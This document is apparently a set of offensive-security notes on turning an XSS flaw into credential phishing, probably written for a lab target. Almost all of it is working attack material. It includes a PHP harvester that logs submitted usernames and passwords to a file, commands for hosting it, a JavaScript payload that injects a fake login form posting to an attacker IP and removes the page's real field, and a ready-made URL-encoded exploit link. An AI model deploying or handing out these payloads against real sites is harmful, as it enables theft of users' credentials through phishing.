# Can be done with any type of XSS. Stored is most dangerous as changes are stored in the site's source code.
# Example
## Index.php

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
## Starting malicious server hosting the index.php

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php #at this step we wrote our index.php file
sudo php -S 0.0.0.0:80
```
## Payload to add malicious form

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```
## Payload to remove URL field:
#### URL :-

```html
<form role="form" action="index.php" method="GET" id='urlform'>
    <input type="text" placeholder="Image URL" name="url">
</form>
```
#### Remove urlform :-

```javascript
document.getElementById('urlform').remove();
```
## Complete URL :- 

```
http://10.129.161.70/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write(%27%3Ch3%3EPlease%20login%20to%20continue%3C/h3%3E%3Cform%20action%3Dhttp%3A//YOUR_IP%3E%3Cinput%20name%3Dusername%20placeholder%3DUsername%3E%3Cinput%20type%3Dpassword%20name%3Dpassword%20placeholder%3DPassword%3E%3Cinput%20type%3Dsubmit%20value%3DLogin%3E%3C/form%3E%27);document.querySelector(%27input[name%3Durl]%27).remove();%3C/script%3E%3Cimg%20src%3D%27
```
## Payload :- URL encoded

```
%27%3E%3Cscript%3Edocument.write(%27%3Ch3%3EPlease%20login%20to%20continue%3C/h3%3E%3Cform%20action%3Dhttp%3A//YOUR_IP%3E%3Cinput%20name%3Dusername%20placeholder%3DUsername%3E%3Cinput%20type%3Dpassword%20name%3Dpassword%20placeholder%3DPassword%3E%3Cinput%20type%3Dsubmit%20value%3DLogin%3E%3C/form%3E%27);document.querySelector(%27input[name%3Durl]%27).remove();%3C/script%3E%3Cimg%20src%3D%27
```
## Payload :- URL Decoded

```html
'><script>document.write('<h3>Please login to continue</h3><form action=http://YOUR_IP><input name=username placeholder=Username><input type=password name=password placeholder=Password><input type=submit value=Login></form>');document.querySelector('input[name=url]').remove();</script><img src='
```
# Tags
> #Exploitation #Web-Exploitation #XSS #Phishing